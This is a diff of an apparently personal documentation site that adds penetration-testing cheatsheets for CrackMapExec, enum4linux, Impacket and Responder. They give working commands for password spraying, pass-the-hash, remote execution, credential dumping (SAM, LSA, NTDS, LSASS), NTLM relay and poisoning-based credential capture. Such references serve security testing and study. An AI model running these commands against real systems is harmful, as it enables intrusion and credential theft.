@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-691b6135.js";
+            window.path_to_searchindex_js = "searchindex-1b3cc894.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-da51b4ec.js"></script>
+        <script src="toc-861b3ff5.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -220,6 +220,13 @@
 <li><a href="#unshadow-cheatsheet">unshadow</a></li>
 <li><a href="#rubeus-cheatsheet">rubeus</a></li>
 <li><a href="#ssh-cheatsheet">ssh</a></li>
+<li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
+<li><a href="#enum4linux-cheatsheet">enum4linux</a></li>
+<li><a href="#impacket-cheatsheet">impacket</a></li>
+<li><a href="#responder-cheatsheet">responder</a></li>
+<li><a href="#rpcclient-cheatsheet">rpcclient</a></li>
+<li><a href="#smbclient-cheatsheet">smbclient</a></li>
+<li><a href="#smbmap-cheatsheet">smbmap</a></li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -500,7 +507,7 @@
 <li><a href="#systemd">Systemd</a></li>
 <li><a href="#the-first-60-seconds">The first 60 seconds</a></li>
 <li><a href="#time">time</a></li>
-<li><a href="#troubleshooting-1">troubleshooting</a></li>
+<li><a href="#troubleshooting-2">troubleshooting</a></li>
 <li><a href="#users-and-user-management">Users and User Management</a></li>
 <li><a href="systems/bash/README.html">Bash</a>
 <ul>
@@ -591,13 +598,14 @@
 </li>
 <li><a href="infosec/README.html">InfoSec</a>
 <ul>
+<li><a href="#attacking-smb">attacking-smb</a></li>
 <li><a href="#cracking-protected-files-and-archives">cracking-protected-files</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="#robotstxt">robots.text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
-<li><a href="#enumeration-1">Enumeration</a></li>
+<li><a href="#enumeration-2">Enumeration</a></li>
 <li><a href="#footprinting-9">footprinting</a></li>
 <li><a href="#hydra-1">Brute-Forcing</a></li>
 <li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
@@ -636,10 +644,13 @@
 <ul>
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
 <li><a href="#cap-theorem">cap_theorem</a></li>
+<li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
+<li><a href="#enum4linux-cheatsheet">enum4linux</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
 <li><a href="#hashcat-cheatsheet">hashcat</a></li>
 <li><a href="#standard-http-headers">http_headers</a></li>
 <li><a href="#hydra-cheatsheet">hydra</a></li>
+<li><a href="#impacket-cheatsheet">impacket</a></li>
 <li><a href="#john-the-ripper-cheatsheet">john</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
@@ -658,8 +669,12 @@
 <li><a href="#ranger-cheatsheet">ranger</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
 <li><a href="#regex-cheatsheet">regex</a></li>
+<li><a href="#responder-cheatsheet">responder</a></li>
+<li><a href="#rpcclient-cheatsheet">rpcclient</a></li>
 <li><a href="#rubeus-cheatsheet">rubeus</a></li>
 <li><a href="#server-side-template-injection">server-side template injection</a></li>
+<li><a href="#smbclient-cheatsheet">smbclient</a></li>
+<li><a href="#smbmap-cheatsheet">smbmap</a></li>
 <li><a href="#sql-cheat-sheet">sql</a></li>
 <li><a href="#ssh-cheatsheet">ssh</a></li>
 <li><a href="#unshadow-cheatsheet">unshadow</a></li>
@@ -4480,6 +4495,956 @@ Host *
     ServerAliveInterval 60
     ServerAliveCountMax 3
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="crackmapexec-cme-cheatsheet"><a class="header" href="#crackmapexec-cme-cheatsheet">CrackMapExec (CME) Cheatsheet</a></h1>
+<p>Swiss army knife for pentesting Windows/AD environments.</p>
+<hr>
+<h2 id="basic-syntax-6"><a class="header" href="#basic-syntax-6">Basic Syntax</a></h2>
+<pre><code class="language-bash">crackmapexec &lt;protocol&gt; &lt;target&gt; [options]
+</code></pre>
+<p>Protocols: <code>smb</code>, <code>ldap</code>, <code>mssql</code>, <code>ssh</code>, <code>winrm</code>, <code>rdp</code>, <code>ftp</code></p>
+<hr>
+<h2 id="target-specification"><a class="header" href="#target-specification">Target Specification</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Format</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td>Single IP</td><td><code>10.10.10.10</code></td></tr>
+<tr><td>CIDR range</td><td><code>10.10.10.0/24</code></td></tr>
+<tr><td>IP range</td><td><code>10.10.10.1-50</code></td></tr>
+<tr><td>File</td><td><code>targets.txt</code></td></tr>
+<tr><td>Hostname</td><td><code>dc01.domain.local</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="authentication-options"><a class="header" href="#authentication-options">Authentication Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-u USER</code></td><td>Username or file</td><td><code>-u admin</code> or <code>-u users.txt</code></td></tr>
+<tr><td><code>-p PASS</code></td><td>Password or file</td><td><code>-p Password123</code> or <code>-p passwords.txt</code></td></tr>
+<tr><td><code>-H HASH</code></td><td>NTLM hash</td><td><code>-H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</code></td></tr>
+<tr><td><code>-d DOMAIN</code></td><td>Domain</td><td><code>-d MYDOMAIN</code></td></tr>
+<tr><td><code>--local-auth</code></td><td>Local authentication</td><td>For non-domain joined machines</td></tr>
+<tr><td><code>-k</code></td><td>Kerberos auth</td><td>Uses ccache from KRB5CCNAME</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="smb-operations"><a class="header" href="#smb-operations">SMB Operations</a></h2>
+<h3 id="check-access"><a class="header" href="#check-access">Check Access</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123
+</code></pre>
+<p>Output indicators:</p>
+<ul>
+<li><code>[+]</code> - Success</li>
+<li><code>[-]</code> - Failure</li>
+<li><code>(Pwn3d!)</code> - Admin access</li>
+</ul>
+<h3 id="enumerate-shares"><a class="header" href="#enumerate-shares">Enumerate Shares</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --shares
+</code></pre>
+<h3 id="list-share-contents"><a class="header" href="#list-share-contents">List Share Contents</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --spider C$ --depth 2
+</code></pre>
+<h3 id="enumerate-users"><a class="header" href="#enumerate-users">Enumerate Users</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --users
+</code></pre>
+<h3 id="enumerate-groups"><a class="header" href="#enumerate-groups">Enumerate Groups</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --groups
+</code></pre>
+<h3 id="enumerate-logged-on-users"><a class="header" href="#enumerate-logged-on-users">Enumerate Logged-on Users</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.0/24 -u admin -p Password123 --loggedon-users
+</code></pre>
+<h3 id="enumerate-sessions"><a class="header" href="#enumerate-sessions">Enumerate Sessions</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --sessions
+</code></pre>
+<hr>
+<h2 id="password-spraying"><a class="header" href="#password-spraying">Password Spraying</a></h2>
+<h3 id="single-password-against-user-list"><a class="header" href="#single-password-against-user-list">Single Password Against User List</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u users.txt -p 'Company01!' --continue-on-success
+</code></pre>
+<h3 id="with-local-auth"><a class="header" href="#with-local-auth">With Local Auth</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123!' --local-auth
+</code></pre>
+<hr>
+<h2 id="command-execution"><a class="header" href="#command-execution">Command Execution</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-x CMD</code></td><td>Execute CMD command</td></tr>
+<tr><td><code>-X CMD</code></td><td>Execute PowerShell command</td></tr>
+<tr><td><code>--exec-method</code></td><td>Method: smbexec, atexec, wmiexec, mmcexec</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="execute-cmd"><a class="header" href="#execute-cmd">Execute CMD</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -x 'whoami'
+</code></pre>
+<h3 id="execute-powershell"><a class="header" href="#execute-powershell">Execute PowerShell</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -X 'Get-Process'
+</code></pre>
+<h3 id="specify-execution-method"><a class="header" href="#specify-execution-method">Specify Execution Method</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -x 'ipconfig' --exec-method smbexec
+</code></pre>
+<hr>
+<h2 id="credential-dumping"><a class="header" href="#credential-dumping">Credential Dumping</a></h2>
+<h3 id="dump-sam-1"><a class="header" href="#dump-sam-1">Dump SAM</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --sam
+</code></pre>
+<h3 id="dump-lsa-secrets"><a class="header" href="#dump-lsa-secrets">Dump LSA Secrets</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --lsa
+</code></pre>
+<h3 id="dump-ntdsdit-domain-controller"><a class="header" href="#dump-ntdsdit-domain-controller">Dump NTDS.dit (Domain Controller)</a></h3>
+<pre><code class="language-bash">crackmapexec smb dc01 -u admin -p Password123 --ntds
+</code></pre>
+<h3 id="dump-lsass"><a class="header" href="#dump-lsass">Dump LSASS</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -M lsassy
+</code></pre>
+<hr>
+<h2 id="pass-the-hash-2"><a class="header" href="#pass-the-hash-2">Pass-the-Hash</a></h2>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
+</code></pre>
+<hr>
+<h2 id="modules-1"><a class="header" href="#modules-1">Modules</a></h2>
+<p>List available modules:</p>
+<pre><code class="language-bash">crackmapexec smb -L
+</code></pre>
+<p>Run a module:</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -M &lt;module&gt;
+</code></pre>
+<p>Common modules:</p>
+<ul>
+<li><code>lsassy</code> - Dump LSASS</li>
+<li><code>mimikatz</code> - Run Mimikatz</li>
+<li><code>spider_plus</code> - Spider shares</li>
+<li><code>enum_av</code> - Enumerate AV products</li>
+<li><code>gpp_password</code> - Find GPP passwords</li>
+</ul>
+<hr>
+<h2 id="database"><a class="header" href="#database">Database</a></h2>
+<p>CME stores results in a database:</p>
+<pre><code class="language-bash">cmedb
+</code></pre>
+<p>Database commands:</p>
+<ul>
+<li><code>hosts</code> - Show discovered hosts</li>
+<li><code>creds</code> - Show captured credentials</li>
+<li><code>export</code> - Export data</li>
+</ul>
+<hr>
+<h2 id="useful-flags"><a class="header" href="#useful-flags">Useful Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--continue-on-success</code></td><td>Don’t stop after first valid cred</td></tr>
+<tr><td><code>--no-bruteforce</code></td><td>Avoid brute force attempts</td></tr>
+<tr><td><code>-v</code></td><td>Verbose output</td></tr>
+<tr><td><code>--gen-relay-list FILE</code></td><td>Generate list of hosts with SMB signing disabled</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="enum4linux-cheatsheet"><a class="header" href="#enum4linux-cheatsheet">enum4linux Cheatsheet</a></h1>
+<p>Tool for enumerating information from Windows and Samba systems via SMB.</p>
+<hr>
+<h2 id="basic-syntax-7"><a class="header" href="#basic-syntax-7">Basic Syntax</a></h2>
+<pre><code class="language-bash">enum4linux [options] &lt;target&gt;
+</code></pre>
+<hr>
+<h2 id="enumeration-options"><a class="header" href="#enumeration-options">Enumeration Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-a</code></td><td>Do all simple enumeration (default)</td></tr>
+<tr><td><code>-U</code></td><td>Get user list</td></tr>
+<tr><td><code>-M</code></td><td>Get machine list</td></tr>
+<tr><td><code>-S</code></td><td>Get share list</td></tr>
+<tr><td><code>-P</code></td><td>Get password policy</td></tr>
+<tr><td><code>-G</code></td><td>Get group and member list</td></tr>
+<tr><td><code>-d</code></td><td>Detail mode (applies to -U and -S)</td></tr>
+<tr><td><code>-o</code></td><td>Get OS information</td></tr>
+<tr><td><code>-i</code></td><td>Get printer information</td></tr>
+<tr><td><code>-n</code></td><td>Do nmblookup (similar to nbtstat)</td></tr>
+<tr><td><code>-r</code></td><td>Enumerate users via RID cycling</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="authentication-options-1"><a class="header" href="#authentication-options-1">Authentication Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-u USER</code></td><td>Username</td><td><code>enum4linux -u admin 10.10.10.10</code></td></tr>
+<tr><td><code>-p PASS</code></td><td>Password</td><td><code>enum4linux -u admin -p Password123 10.10.10.10</code></td></tr>
+<tr><td><code>-w DOMAIN</code></td><td>Workgroup/domain</td><td><code>enum4linux -w MYDOMAIN 10.10.10.10</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-examples"><a class="header" href="#common-examples">Common Examples</a></h2>
+<h3 id="full-enumeration-anonymous"><a class="header" href="#full-enumeration-anonymous">Full Enumeration (Anonymous)</a></h3>
+<pre><code class="language-bash">enum4linux -a 10.10.10.10
+</code></pre>
+<h3 id="enumerate-users-1"><a class="header" href="#enumerate-users-1">Enumerate Users</a></h3>
+<pre><code class="language-bash">enum4linux -U 10.10.10.10
+</code></pre>
+<h3 id="enumerate-shares-1"><a class="header" href="#enumerate-shares-1">Enumerate Shares</a></h3>
+<pre><code class="language-bash">enum4linux -S 10.10.10.10
+</code></pre>
+<h3 id="enumerate-groups-1"><a class="header" href="#enumerate-groups-1">Enumerate Groups</a></h3>
+<pre><code class="language-bash">enum4linux -G 10.10.10.10
+</code></pre>
+<h3 id="get-password-policy"><a class="header" href="#get-password-policy">Get Password Policy</a></h3>
+<pre><code class="language-bash">enum4linux -P 10.10.10.10
+</code></pre>
+<h3 id="rid-cycling-user-enumeration"><a class="header" href="#rid-cycling-user-enumeration">RID Cycling (User Enumeration)</a></h3>
+<pre><code class="language-bash">enum4linux -r 10.10.10.10
+</code></pre>
+<h3 id="with-credentials"><a class="header" href="#with-credentials">With Credentials</a></h3>
+<pre><code class="language-bash">enum4linux -a -u admin -p Password123 10.10.10.10
+</code></pre>
+<h3 id="detailed-user-enumeration"><a class="header" href="#detailed-user-enumeration">Detailed User Enumeration</a></h3>
+<pre><code class="language-bash">enum4linux -U -d 10.10.10.10
+</code></pre>
+<hr>
+<h2 id="enum4linux-ng"><a class="header" href="#enum4linux-ng">enum4linux-ng</a></h2>
+<p>Modern rewrite with additional features:</p>
+<h3 id="installation-3"><a class="header" href="#installation-3">Installation</a></h3>
+<pre><code class="language-bash">pip install enum4linux-ng
+</code></pre>
+<h3 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h3>
+<pre><code class="language-bash">enum4linux-ng 10.10.10.10
+</code></pre>
+<h3 id="with-credentials-1"><a class="header" href="#with-credentials-1">With Credentials</a></h3>
+<pre><code class="language-bash">enum4linux-ng -u admin -p Password123 10.10.10.10
+</code></pre>
+<h3 id="output-to-json"><a class="header" href="#output-to-json">Output to JSON</a></h3>
+<pre><code class="language-bash">enum4linux-ng -oJ output.json 10.10.10.10
+</code></pre>
+<hr>
+<h2 id="information-gathered"><a class="header" href="#information-gathered">Information Gathered</a></h2>
+<ul>
+<li>Target information (hostname, domain, OS)</li>
+<li>User accounts and RIDs</li>
+<li>Group memberships</li>
+<li>Share listings and permissions</li>
+<li>Password policies</li>
+<li>Printer information</li>
+<li>NetBIOS names</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="impacket-cheatsheet"><a class="header" href="#impacket-cheatsheet">Impacket Cheatsheet</a></h1>
+<p>Collection of Python tools for working with network protocols (SMB, MSRPC, etc.).</p>
+<hr>
+<h2 id="authentication-format"><a class="header" href="#authentication-format">Authentication Format</a></h2>
+<p>All tools use the same authentication format:</p>
+<pre><code>[[domain/]username[:password]@]&lt;target&gt;
+</code></pre>
+<p>Examples:</p>
+<ul>
+<li><code>administrator:Password123@10.10.10.10</code></li>
+<li><code>DOMAIN/admin:Password123@10.10.10.10</code></li>
+<li><code>admin@10.10.10.10</code> (prompts for password)</li>
+</ul>
+<hr>
+<h2 id="pass-the-hash-3"><a class="header" href="#pass-the-hash-3">Pass-the-Hash</a></h2>
+<p>Use <code>-hashes</code> with format <code>LMHASH:NTHASH</code>:</p>
+<pre><code class="language-bash">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.10
+</code></pre>
+<hr>
+<h2 id="impacket-psexec"><a class="header" href="#impacket-psexec">impacket-psexec</a></h2>
+<p>Remote command execution using RemComSvc.</p>
+<h3 id="interactive-shell"><a class="header" href="#interactive-shell">Interactive Shell</a></h3>
+<pre><code class="language-bash">impacket-psexec administrator:'Password123'@10.10.10.10
+</code></pre>
+<h3 id="execute-command"><a class="header" href="#execute-command">Execute Command</a></h3>
+<pre><code class="language-bash">impacket-psexec administrator:'Password123'@10.10.10.10 'whoami'
+</code></pre>
+<h3 id="domain-account"><a class="header" href="#domain-account">Domain Account</a></h3>
+<pre><code class="language-bash">impacket-psexec DOMAIN/admin:'Password123'@10.10.10.10
+</code></pre>
+<h3 id="pass-the-hash-1-1"><a class="header" href="#pass-the-hash-1-1">Pass-the-Hash</a></h3>
+<pre><code class="language-bash">impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.10
+</code></pre>
+<hr>
+<h2 id="impacket-smbexec"><a class="header" href="#impacket-smbexec">impacket-smbexec</a></h2>
+<p>Similar to psexec but doesn’t upload binary. Uses local SMB server for output.</p>
+<h3 id="interactive-shell-1"><a class="header" href="#interactive-shell-1">Interactive Shell</a></h3>
+<pre><code class="language-bash">impacket-smbexec administrator:'Password123'@10.10.10.10
+</code></pre>
+<h3 id="with-share"><a class="header" href="#with-share">With Share</a></h3>
+<pre><code class="language-bash">impacket-smbexec -share ADMIN$ administrator:'Password123'@10.10.10.10
+</code></pre>
+<hr>
+<h2 id="impacket-atexec"><a class="header" href="#impacket-atexec">impacket-atexec</a></h2>
+<p>Execute commands via Task Scheduler service.</p>
+<h3 id="execute-command-1"><a class="header" href="#execute-command-1">Execute Command</a></h3>
+<pre><code class="language-bash">impacket-atexec administrator:'Password123'@10.10.10.10 'whoami'
+</code></pre>
+<h3 id="pass-the-hash-2-1"><a class="header" href="#pass-the-hash-2-1">Pass-the-Hash</a></h3>
+<pre><code class="language-bash">impacket-atexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.10 'ipconfig'
+</code></pre>
+<hr>
+<h2 id="impacket-wmiexec"><a class="header" href="#impacket-wmiexec">impacket-wmiexec</a></h2>
+<p>Execute commands via WMI.</p>
+<h3 id="interactive-shell-2"><a class="header" href="#interactive-shell-2">Interactive Shell</a></h3>
+<pre><code class="language-bash">impacket-wmiexec administrator:'Password123'@10.10.10.10
+</code></pre>
+<h3 id="execute-command-2"><a class="header" href="#execute-command-2">Execute Command</a></h3>
+<pre><code class="language-bash">impacket-wmiexec administrator:'Password123'@10.10.10.10 'whoami'
+</code></pre>
+<hr>
+<h2 id="impacket-dcomexec"><a class="header" href="#impacket-dcomexec">impacket-dcomexec</a></h2>
+<p>Execute commands via DCOM.</p>
+<pre><code class="language-bash">impacket-dcomexec administrator:'Password123'@10.10.10.10
+</code></pre>
+<hr>
+<h2 id="impacket-ntlmrelayx"><a class="header" href="#impacket-ntlmrelayx">impacket-ntlmrelayx</a></h2>
+<p>NTLM relay attack tool.</p>
+<h3 id="basic-relay-dump-sam"><a class="header" href="#basic-relay-dump-sam">Basic Relay (Dump SAM)</a></h3>
+<pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10
+</code></pre>
+<h3 id="relay-with-command-execution"><a class="header" href="#relay-with-command-execution">Relay with Command Execution</a></h3>
+<pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e &lt;BASE64&gt;'
+</code></pre>
+<h3 id="relay-to-multiple-targets"><a class="header" href="#relay-to-multiple-targets">Relay to Multiple Targets</a></h3>
+<pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt
+</code></pre>
+<h3 id="options-1"><a class="header" href="#options-1">Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-t TARGET</code></td><td>Single target</td></tr>
+<tr><td><code>-tf FILE</code></td><td>Targets file</td></tr>
+<tr><td><code>-smb2support</code></td><td>Enable SMB2 support</td></tr>
+<tr><td><code>--no-http-server</code></td><td>Disable HTTP server</td></tr>
+<tr><td><code>-c CMD</code></td><td>Command to execute</td></tr>
+<tr><td><code>-e FILE</code></td><td>Execute file</td></tr>
+<tr><td><code>-w</code></td><td>Watch for incoming connections</td></tr>
+<tr><td><code>--remove-mic</code></td><td>Remove MIC (CVE-2019-1040)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="impacket-secretsdump"><a class="header" href="#impacket-secretsdump">impacket-secretsdump</a></h2>
+<p>Dump secrets from SAM, LSA, and NTDS.dit.</p>
+<h3 id="local-sam-dump"><a class="header" href="#local-sam-dump">Local SAM Dump</a></h3>
+<pre><code class="language-bash">impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+</code></pre>
+<h3 id="remote-dump"><a class="header" href="#remote-dump">Remote Dump</a></h3>
+<pre><code class="language-bash">impacket-secretsdump administrator:'Password123'@10.10.10.10
+</code></pre>
+<h3 id="dump-ntds-domain-controller"><a class="header" href="#dump-ntds-domain-controller">Dump NTDS (Domain Controller)</a></h3>
+<pre><code class="language-bash">impacket-secretsdump -just-dc administrator:'Password123'@dc01.domain.local
+</code></pre>
+<h3 id="just-ntlm-hashes"><a class="header" href="#just-ntlm-hashes">Just NTLM Hashes</a></h3>
+<pre><code class="language-bash">impacket-secretsdump -just-dc-ntlm administrator:'Password123'@dc01.domain.local
+</code></pre>
+<hr>
+<h2 id="impacket-smbclient"><a class="header" href="#impacket-smbclient">impacket-smbclient</a></h2>
+<p>SMB client similar to smbclient.</p>
+<pre><code class="language-bash">impacket-smbclient administrator:'Password123'@10.10.10.10
+</code></pre>
+<p>Commands: <code>shares</code>, <code>use</code>, <code>ls</code>, <code>cd</code>, <code>get</code>, <code>put</code>, <code>cat</code></p>
+<hr>
+<h2 id="impacket-smbserver"><a class="header" href="#impacket-smbserver">impacket-smbserver</a></h2>
+<p>Create a local SMB server.</p>
+<h3 id="basic-server"><a class="header" href="#basic-server">Basic Server</a></h3>
+<pre><code class="language-bash">impacket-smbserver share /path/to/share
+</code></pre>
+<h3 id="with-smb2-support"><a class="header" href="#with-smb2-support">With SMB2 Support</a></h3>
+<pre><code class="language-bash">impacket-smbserver share /path/to/share -smb2support
+</code></pre>
+<h3 id="with-authentication"><a class="header" href="#with-authentication">With Authentication</a></h3>
+<pre><code class="language-bash">impacket-smbserver share /path/to/share -username user -password pass
+</code></pre>
+<hr>
+<h2 id="impacket-getnpusers"><a class="header" href="#impacket-getnpusers">impacket-GetNPUsers</a></h2>
+<p>AS-REP Roasting - get TGT for users with “Do not require Kerberos preauthentication”.</p>
+<pre><code class="language-bash">impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
+</code></pre>
+<hr>
+<h2 id="impacket-getuserspns"><a class="header" href="#impacket-getuserspns">impacket-GetUserSPNs</a></h2>
+<p>Kerberoasting - get service tickets for cracking.</p>
+<pre><code class="language-bash">impacket-GetUserSPNs DOMAIN/user:'Password123' -dc-ip 10.10.10.10 -request
+</code></pre>
+<hr>
+<h2 id="common-options-6"><a class="header" href="#common-options-6">Common Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-hashes LMHASH:NTHASH</code></td><td>Use NTLM hashes</td></tr>
+<tr><td><code>-no-pass</code></td><td>Don’t ask for password</td></tr>
+<tr><td><code>-k</code></td><td>Use Kerberos authentication</td></tr>
+<tr><td><code>-dc-ip IP</code></td><td>Domain controller IP</td></tr>
+<tr><td><code>-target-ip IP</code></td><td>Target IP (if hostname used)</td></tr>
+<tr><td><code>-debug</code></td><td>Enable debug output</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="responder-cheatsheet"><a class="header" href="#responder-cheatsheet">Responder Cheatsheet</a></h1>
+<p>LLMNR, NBT-NS, and MDNS poisoner for capturing credentials.</p>
+<hr>
+<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
+<pre><code class="language-bash">sudo responder -I &lt;interface&gt; [options]
+</code></pre>
+<hr>
+<h2 id="core-options"><a class="header" href="#core-options">Core Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-I INTERFACE</code></td><td>Network interface (required)</td></tr>
+<tr><td><code>-i IP</code></td><td>Local IP to use</td></tr>
+<tr><td><code>-e IP</code></td><td>External IP for WPAD</td></tr>
+<tr><td><code>-b</code></td><td>Return basic HTTP auth</td></tr>
+<tr><td><code>-r</code></td><td>Enable answers for netbios wredir suffix queries</td></tr>
+<tr><td><code>-d</code></td><td>Enable answers for netbios domain suffix queries</td></tr>
+<tr><td><code>-w</code></td><td>Start WPAD rogue proxy server</td></tr>
+<tr><td><code>-F</code></td><td>Force WPAD auth on wpad.dat file retrieval</td></tr>
+<tr><td><code>-P</code></td><td>Force proxy auth (may cause DOS)</td></tr>
+<tr><td><code>-v</code></td><td>Verbose mode</td></tr>
+<tr><td><code>-A</code></td><td>Analyze mode (no poisoning)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
+<h3 id="start-responder"><a class="header" href="#start-responder">Start Responder</a></h3>
+<pre><code class="language-bash">sudo responder -I eth0
+</code></pre>
+<h3 id="with-wpad-proxy"><a class="header" href="#with-wpad-proxy">With WPAD Proxy</a></h3>
+<pre><code class="language-bash">sudo responder -I eth0 -wFP
+</code></pre>
+<h3 id="analyze-mode-passive"><a class="header" href="#analyze-mode-passive">Analyze Mode (Passive)</a></h3>
+<pre><code class="language-bash">sudo responder -I eth0 -A
+</code></pre>
+<h3 id="force-basic-auth"><a class="header" href="#force-basic-auth">Force Basic Auth</a></h3>
+<pre><code class="language-bash">sudo responder -I eth0 -b
+</code></pre>
+<hr>
+<h2 id="protocols-poisoned"><a class="header" href="#protocols-poisoned">Protocols Poisoned</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Protocol</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>LLMNR</td><td>Link-Local Multicast Name Resolution</td></tr>
+<tr><td>NBT-NS</td><td>NetBIOS Name Service</td></tr>
+<tr><td>MDNS</td><td>Multicast DNS</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="servers-started"><a class="header" href="#servers-started">Servers Started</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Server</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>HTTP</td><td>Capture HTTP auth</td></tr>
+<tr><td>HTTPS</td><td>Capture HTTPS auth</td></tr>
+<tr><td>SMB</td><td>Capture SMB auth (NTLMv1/v2)</td></tr>
+<tr><td>LDAP</td><td>Capture LDAP auth</td></tr>
+<tr><td>SQL</td><td>Capture MSSQL auth</td></tr>
+<tr><td>FTP</td><td>Capture FTP credentials</td></tr>
+<tr><td>POP3</td><td>Capture POP3 credentials</td></tr>
+<tr><td>IMAP</td><td>Capture IMAP credentials</td></tr>
+<tr><td>SMTP</td><td>Capture SMTP credentials</td></tr>
+<tr><td>DNS</td><td>Respond to DNS queries</td></tr>
+<tr><td>Kerberos</td><td>Capture Kerberos auth</td></tr>
+<tr><td>WPAD</td><td>Web Proxy Auto-Discovery</td></tr>
+<tr><td>WinRM</td><td>Windows Remote Management</td></tr>
+<tr><td>RDP</td><td>Remote Desktop Protocol</td></tr>
+<tr><td>DCE-RPC</td><td>Capture RPC auth</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
